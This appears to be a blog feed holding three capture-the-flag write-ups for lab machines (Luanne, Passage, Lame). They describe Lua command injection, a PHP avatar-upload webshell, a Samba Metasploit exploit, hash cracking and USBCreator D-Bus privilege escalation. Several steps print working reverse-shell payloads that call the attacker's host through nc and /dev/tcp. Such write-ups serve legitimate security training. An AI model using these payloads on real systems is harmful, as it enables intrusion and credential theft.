channel.title: Posts on Mdn1nj4
channel.description: Recent content in Posts on Mdn1nj4

item.title: Luanne Writeup
item.description:
Info

Luanne is the Easy level OpenBSD machine.

Machine created by : polarbearer

Port Scan

$ nmap -sC -sV -p- 10.10.10.218

 1Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 19:18 GMT
 2Nmap scan report for 10.10.10.218
 3Host is up (0.039s latency).
 4
 5PORT     STATE SERVICE VERSION
 622/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
 7| ssh-hostkey: 
 8|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
 9|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
10|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
1180/tcp   open  http    nginx 1.19.0
12| http-auth: 
13| HTTP/1.1 401 Unauthorized\x0D
14|_  Basic realm=.
15| http-robots.txt: 1 disallowed entry 
16|_/weather
17|_http-server-header: nginx/1.19.0
18|_http-title: 401 Unauthorized
199001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
20| http-auth: 
21| HTTP/1.1 401 Unauthorized\x0D
22|_  Basic realm=default
23|_http-server-header: Medusa/1.12
24|_http-title: Error response
25Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
26
27Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
28Nmap done: 1 IP address (1 host up) scanned in 200.98 seconds

After the nmap scan there is three ports are open in the Luanne Machine

22 - SSH OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
80 - HTTP nginx 1.19.0
9001 - HTTP Medusa httpd 1.12 (Supervisor process manager)

Enumuration

In port 80 When i try to access the web page. It asks for username and password.
If i hit enter it show the error with 401 Unathorized

and it reveal the it running in the port 3000 127.0.0.1:3000

after reading the robots.txt i decide to open the directory

1curl http://10.10.10.218/robots.txt
2User-agent: *
3Disallow: /weather  #returning 404 but still harvesting cities

But /weather is not foound so i run the gobuster.

$ gobuster dir -u http://10.10.10.218/weather/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

 1Gobuster v3.1.0
 2by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 3===============================================================
 4[+] Url:                     http://10.10.10.218/weather/
 5[+] Method:                  GET
 6[+] Threads:                 10
 7[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 8[+] Negative Status codes:   404
 9[+] User Agent:              gobuster/3.1.0
10[+] Timeout:                 10s
11===============================================================
122021/03/27 19:57:40 Starting gobuster in directory enumeration mode
13===============================================================
14/forecast             (Status: 200) [Size: 90]
15

After the gobuster it found the directory /weather/forecast so let’s have a look at it.

if we want to list the cities we have pass the parameter "city=list"

it show the list of cities.

then check the city london /weather/forecast?city=london

If you the pass ' in the city parameter /weather/forecast?city=' It show the lua error.

Lua Remote Code Execution

After that os.execute() is used for Execute the command in lua script so i used that funtion.

Payload :

');os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1234 >/tmp/f')--

we break the code script flow and inject our lua code and "--" used in lua language for comment
make sure to encode the payload
Encoded payload :

%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201234%20%3E%2Ftmp%2Ff%27%29--

Create listener then run the curl command

$ curl 'http://10.10.10.218/weather/forecast?city=%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201234%20%3E%2Ftmp%2Ff%27%29--'

Getting httpd shell

$ nc -1vvnkp 1234

1nc -lvvnkp 1234
2listening on [any] 1234 ...
3connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.218] 65471
4sh: can't access tty; job control turned off
5$ id
6uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
7$

After some enumuration i found the .htaccess file which contain webapi_user password

copy the hash and the save to the file.

then crack the hash with john

$ john hash --wordlist=/opt/rockyou.txt

 1john hash --wordlist=/opt/rockyou.txt
 2Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
 3Use the "--format=md5crypt-long" option to force loading these as that type instead
 4Using default input encoding: UTF-8
 5Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
 6Will run 2 OpenMP threads
 7Press 'q' or Ctrl-C to abort, almost any other key for status
 8iamthebest       (webapi_user)
 91g 0:00:00:00 DONE (2021-03-27 21:02) 5.555g/s 16533p/s 16533c/s 16533C/s secrets..lance
10Use the "--show" option to display all of the cracked passwords reliably
11Session completed

Now i have webapi_user : iamthebest

then try to login with ssh but failed!

Next webserver

Nothing interesting

Getting r.Michaels Shell

After some enumuration i found the 127.0.0.1:3001 also have the same page but why

I want to check that so i run the curl command with payload

But it failed

1curl 'http://127.0.0.1:3001/weather/forecast?city=%27%29%3Bos.execute%28%27rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.6%201234%20%3E%2Ftmp%2Ff%27%29--'
2  
3{"code": 500,"error": "unknown city: ');os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f')--"}

I does not execute it return unknown city,so i confirmed that 3001 port server has been patched.

After reading the NetBSD httpd documentation.

I get the idea

$ curl http://127.0.0.1:3001/~r.michaels/ -s --user "webapi_user:iamthebest"

 1<!DOCTYPE html>
 2<html><head><meta charset="utf-8"/>
 3<style type="text/css">
 4table {
 5	border-top: 1px solid black;
 6	border-bottom: 1px solid black;
 7}
 8th { background: aquamarine; }
 9tr:nth-child(even) { background: lavender; }
10</style>
11<title>Index of ~r.michaels/</title></head>
12<body><h1>Index of ~r.michaels/</h1>
13<table cols=3>
14<thead>
15<tr><th>Name<th>Last modified<th align=right>Size
16<tbody>
17<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
18<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
19</table>
20</body></html>

It show there is one file with the name id_rsa

r.michaels ssh key redirect to the file key in /tmp

$ curl http://127.0.0.1:3001/~r.michaels/id_rsa -s --user "webapi_user:iamthebest" > /tmp/key

$ cat key | base64

Then copy the base64 encoded

$ echo 'paste here ' | base64 -d > user.key

$ chmod 600 user.key

$ ssh -i user.key r.michaels@10.10.10.218

 1ssh -i key r.michaels@10.10.10.218
 2The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
 3ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
 4Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 5Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
 6Last login: Fri Sep 18 07:06:51 2020
 7NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
 8
 9Welcome to NetBSD!
10
11luanne$ id
12uid=1000(r.michaels) gid=100(users) groups=100(users)
13

User flag!

Privilege Escalation

In /home/r.michaels/backups directory found the encrypted tar file devel_backup-2020-09-16.tar.gz.enc

1luanne$ ll
2total 4
3-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc

In /home/r.michaels/.gnupg i found two files

1luanne$ ls
2pubring.gpg secring.gpg
3luanne$ ll
4total 8
5-rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg
6-rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg

So, i googled that "NetBSD gnupg"

So that two files are used by the gnupg for encrypt and decrypt.because the netpgp is encrypt the files using the public and private keys. we have the two one is public and another one is private key.

So let decrypt the file using the NetBSD netpgp

$ cd /home/r.michaels/backups/

$ netpgp --decrypt --output=/tmp/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc

Change the directory to /tmp

$cd /tmp

Unzip the tar file

$ tar -xzf devel_backup-2020-09-16.tar.gz

Searching for file so i used the find command to fetch the files.

$ find . -type f

1luanne$ find . -type f
2./www/index.html
3./www/.htpasswd
4./webapi/weather.lua

we found the another .htaccess file so crack

$ cat ./www/.htpasswd

copy the hash and crack with john

$ john hash_file --wordlist=/opt/rockyou.txt

 1john hash_file --wordlist=/opt/rockyou.txt
 2Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
 3Use the "--format=md5crypt-long" option to force loading these as that type instead
 4Using default input encoding: UTF-8
 5Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
 6Will run 2 OpenMP threads
 7Press 'q' or Ctrl-C to abort, almost any other key for status
 8littlebear       (webapi_user)
 91g 0:00:00:00 DONE (2021-03-27 22:31) 4.545g/s 58909p/s 58909c/s 58909C/s tormenta..balanta
10Use the "--show" option to display all of the cracked passwords reliably
11Session completed

we crack the new password : littlebear

After some enumuration i found the config file /usr/pkg/etc/doas.conf

1cat /usr/pkg/etc/doas.conf
2permit r.michaels as root

doas - execute commands as another user.The doas utility executes the given command as another user and it is alternative for the sudo.

$ doas -u root /bin/ksh
password : littlebear

1luanne$ doas -u root /bin/ksh
2Password:
3# id
4uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)

#Rooted

item.title: Passage Writeup
item.description:
Introduction

Passage is medium level machine, Enumuration is the key for this box. First we have to exploit the cutenews Web application to Get the initial reverse shell after that i found the bunch of php files which contains the user information with base64 format then we get the hash for the user paul and decrypt the hash and i login to to user paul. The user paul and nadav share the ssh keys so i copied the ssh key and Get access to the user nadav after that i found the nadav user in sudo group and .vim info reveal the usefull imformation for getting root this machine In order to root this machine i used the USBCreator D-Bus Privilege Escalation.

Skills Required : Enumuration, Basic linux command
Skills Learned : web Exploitaion, USBCreator D-Bus Privilege Escalation

Enumuration

Nmap scan

the nmap scan show there is 2 port open

  1. 22 ssh
  2. 80 http
 1#nmap -sV -sC -oN scan-tcp.nmap 10.10.10.206
 2Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 17:32 GMT
 3Nmap scan report for 10.10.10.206
 4Host is up (0.040s latency).
 5Not shown: 998 closed ports
 6PORT   STATE SERVICE VERSION
 722/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 8| ssh-hostkey: 
 9|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
10|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
11|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
1280/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
13|_http-server-header: Apache/2.4.18 (Ubuntu)
14|_http-title: Passage News
15Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
16
17Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
18Nmap done: 1 IP address (1 host up) scanned in 22.31 seconds

so the machine run the apache web server. I opened the web page in my browser

CuteNews

Web page

web page show the host name and give me the 2 Email address
admin : nadav@passage.htb
paul Colas : paul@passage.htb

I add the passage.htb on my /etc/hosts file.
and the page reveals website is powered by Cutenews after searching on the internet i found the cutenews is the news management based on flat files as a storage.

Google Result

so after that i searched on the internet for any Exploit available for cutenews ad i looked the page source code i found some interesting information

1# Source Page Code 
2<link href="CuteNews/libs/css/cosmo.min.css" rel="stylesheet">
3<link href="CuteNews/libs/css/font-awesome.min.css" rel="stylesheet">

After that i go the directory Cutenews and i found the login page of the cutenews

https://10.10.10.206/CuteNews

the login page of the Cutenews show the version of the cutenews is 2.1.2

CuteNews 2.1.2 - Remote Code Execution

so i check for the exploit in exploitdb using the command searchsploit

user@home:~$ searchsploit cutenews 2.1.2

 1#searchsploit cutenews 2.1.2
 2----------------------------------------------------------------------------------------------------- ---------------------------------
 3 Exploit Title                                                                                       |  Path
 4----------------------------------------------------------------------------------------------------- ---------------------------------
 5CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                         | php/remote/46698.rb
 6CuteNews 2.1.2 - Arbitrary File Deletion                                                             | php/webapps/48447.txt
 7CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                 | php/webapps/48458.txt
 8CuteNews 2.1.2 - Remote Code Execution                                                               | php/webapps/48800.py
 9----------------------------------------------------------------------------------------------------- ---------------------------------
10Shellcodes: No Results

user@home:~$ searchsploit -m php/webapps/48800.py

if you want to run that script its ok but i have to exploit the cutenews manually.

Its simple 3 step process.

  1. create a user

Register Form

  1. then click on the personal options
  2. scroll down you see the upload avatar upload the shell.php

user@home:~$ vim shell.php

1GIF8;
2<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOURIP/1234 0>&1'") ?>

save the file and upload.
before open the avatar image you need to create a listener on port 1234 with nc commmand

user@home:~$ nc -lvvnkp 1234

open the avatar image in the browser and i got that shell!

1#nc -lvvnkp 1234
2listening on [any] 1234 ...
3connect to [10.10.14.xx] from (UNKNOWN) [10.10.10.206] 37080
4bash: cannot set terminal process group (1635): Inappropriate ioctl for device
5bash: no job control in this shell
6www-data@passage:/var/www/html/CuteNews/uploads$ id    
7id
8uid=33(www-data) gid=33(www-data) groups=33(www-data)
9www-data@passage:/var/www/html/CuteNews/uploads$

Getting User Paul

after some enumuration i found the directory which contains the user information and password hash in base64 format

 1www-data@passage:/var/www/html/CuteNews/cdata/users$ ls
 2ls
 301.php
 409.php
 50a.php
 616.php
 721.php
 82a.php
 932.php
1052.php
115d.php
1262.php
1366.php
146e.php
1577.php
167a.php
1781.php
188f.php
1997.php
20a5.php
21b0.php
22b1.php
23c8.php
24d2.php
25d4.php
26d5.php
27d6.php
28e0.php
29f3.php
30fc.php
31lines
32users.txt

cat 09.php

1www-data@passage:/var/www/html/CuteNews/cdata/users$ cat 09.php
2cat 09.php
3<?php die('Direct call - access denied'); ?>
4YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319

Decode the base64

echo base64_text | base64 -d

1www-data@passage:/var/www/html/CuteNews/cdata/users$ echo "YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319" | base64 -d
2<Fzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319" | base64 -d                     
3a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}

so i decided to decode all the files i know the base64 is mostly start with "Y" so used the command

1www-data@passage:/var/www/html/CuteNews/cdata/users$ grep -rh Y | base64 -d

i got the paul user hash let crack the hash with john

user@home:~$ echo 'e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd' > hash

john hash --wordlist=/opt/rockyou.txt --format=Raw-SHA256

 1#john hash --wordlist=/opt/rockyou.txt --format=Raw-SHA256
 2Using default input encoding: UTF-8
 3Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
 4Warning: poor OpenMP scalability for this hash type, consider --fork=2
 5Will run 2 OpenMP threads
 6Press 'q' or Ctrl-C to abort, almost any other key for status
 7atlanXXX         (?)
 81g 0:00:00:00 DONE (2021-03-18 18:52) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
 9Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
10Session completed

change the user to paul

python3 -c "import pty;pty.spawn('/bin/bash')"

su paul

1www-data@passage:/var/www/html/CuteNews/cdata/users$ python3 -c "import pty;pty.spawn('/bin/bash')"
2<tml/CuteNews/cdata/users$ python3 -c "import pty;pty.spawn('/bin/bash')"    
3www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
4su paul
5Password: 
6
7paul@passage:/var/www/html/CuteNews/cdata/users$

Found the user flag at /home/paul/user.txt

1paul@passage:~$ pwd
2pwd
3/home/paul
4paul@passage:~$ wc user.txt
5wc user.txt
6 1  1 33 user.txt

Privilage Escalation

after some enumuration i found the interesting only one entry in the auhorization_keys

1paul@passage:~/.ssh$ cat authorized_keys
2cat authorized_keys
3ssh-rsa  nadav@passage

Getting User nadav

then i assume there is a possible that the user paul and nadav have shared SSH keys. so i copied the id_rsa file from the paul.

user@home:~$ chmod 600 nadav.key

user@home:~$ ssh -i nadav.key nadav@passage.htb

It worked I got the user nadav

1chmod 600 nadav.key
2
3ssh -i nadav.key nadav@passage.htb
4Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
5nadav@passage:~$ id
6uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
7nadav@passage:~$

Getting Root

After some enumuration i found the some interesting information from .vim file The vim history indicates that there have been some changes in the files /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf and /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf.

nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf

 1nadav@passage:~$ cat  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
 2<!DOCTYPE busconfig PUBLIC
 3 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 4 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
 5<busconfig>
 6
 7  <!-- Only root can own the service -->
 8  <policy user="root">
 9    <allow own="com.ubuntu.USBCreator"/>
10  </policy>
11
12  <!-- Allow anyone to invoke methods (further constrained by
13       PolicyKit privileges -->
14  <policy context="default">
15    <allow send_destination="com.ubuntu.USBCreator" 
16           send_interface="com.ubuntu.USBCreator"/>
17    <allow send_destination="com.ubuntu.USBCreator" 
18           send_interface="org.freedesktop.DBus.Introspectable"/>
19    <allow send_destination="com.ubuntu.USBCreator" 
20           send_interface="org.freedesktop.DBus.Properties"/>
21  </policy>
22
23</busconfig>

nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

1nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
2[Configuration]
3AdminIdentities=unix-group:sudo;unix-group:admin
4nadav@passage:~$

so i copy the file name and google it. what i understand is the user with sudo group can do the privilage escalation and the user nadav is the sudo group user so i try that command. after that i used the command to get the ssh key of the root user and copied to the /home/nadav/key

gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/key true

1nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/key true
2()
3

copy the key file to my machine and saved it with name root.key then give the permission

user@home:~$ chmod 600 root.key

so let login to the root user.... BOOM

user@home:~$ ssh -i root.key root@passage.htb

1#ssh -i root.key root@passage.htb
2Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
3root@passage:~# id
4uid=0(root) gid=0(root) groups=0(root)
5root@passage:~# wc root.txt
6 1  1 33 root.txt
7root@passage:~#

#rooted

item.title: Lame Writeup
item.description:
Introduction

Lame is easy level beginner machine, Basic enumuration and exploiting the samba service which run the vuln version with RCE.

Enumuration

Always start with the common ports scanning for the open ports.I alwaysuse nmap to scan for the open ports.Nmap reveals the open ports.

 1#nmap -sV -oN lame.nmap 10.10.10.3 -Pn
 2Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 3Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 03:46 GMT
 4Nmap scan report for 10.10.10.3
 5Host is up (0.13s latency).
 6Not shown: 996 filtered ports
 7PORT    STATE SERVICE     VERSION
 821/tcp  open  ftp         vsftpd 2.3.4
 922/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
10139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
11445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
12Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
13
14Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
15Nmap done: 1 IP address (1 host up) scanned in 32.51 seconds

21 - FTP (Exploit Failed)

I do some googling for is there any exploit available for the ftp version and i got the RCE exploit for the vsftpd service but it seems to be not worked for me.

1telnet 10.10.10.3 21
2Trying 10.10.10.3...
3Connected to 10.10.10.3.
4Escape character is '^]'.
5220 (vsFTPd 2.3.4)
6USER user:)
7331 Please specify the password.
8PASS pass

1#nc 10.10.10.3 6200
2id
3whoami
4    #does not work

Exploitation

FTP is not a way to get this machine. So i moved to the samba service which is run in the lame machine. The version of the samba server seems to be exploitable ,Because it was outdated version so i hope there is some exploit available for the version.

Samba user name map script

I found the exploit for the samba in searchsploit.There is exploit available in metasploit

 1$searchsploit samba 3.0
 2----------------------------------------------------------------------------------------------------- ---------------------------------
 3 Exploit Title                                                                                       |  Path
 4----------------------------------------------------------------------------------------------------- ---------------------------------
 5Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                 | osx/remote/16875.rb
 6Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                               | multiple/remote/10095.txt
 7Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                     | unix/remote/16320.rb
 8Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                   | linux/remote/9950.rb
 9Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                               | linux/remote/16859.rb
10Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                             | solaris/remote/16329.rb
11Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                             | linux/dos/4732.c
12Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                    | multiple/dos/5712.pl
13Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                     | linux/remote/364.pl
14Samba < 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
15Samba < 3.0.20 - Remote Heap Overflow                                                                | linux/remote/7701.txt
16Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                        | linux_x86/dos/36741.py
17----------------------------------------------------------------------------------------------------- ---------------------------------
18Shellcodes: No Results

so i used it. reference link

 1msf6 > use multi/samba/usermap_script
 2[*] No payload configured, defaulting to cmd/unix/reverse_netcat
 3msf6 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
 4rhost => 10.10.10.3
 5msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.4
 6lhost => 10.10.14.4
 7msf6 exploit(multi/samba/usermap_script) > exploit
 8
 9[*] Started reverse TCP handler on 10.10.14.4:4444 
10[*] Command shell session 1 opened (10.10.14.4:4444 -> 10.10.10.3:33415) at 2021-03-17 04:00:50 +0000
11
12id
13uid=0(root) gid=0(root)
14

#Rooted this machine.
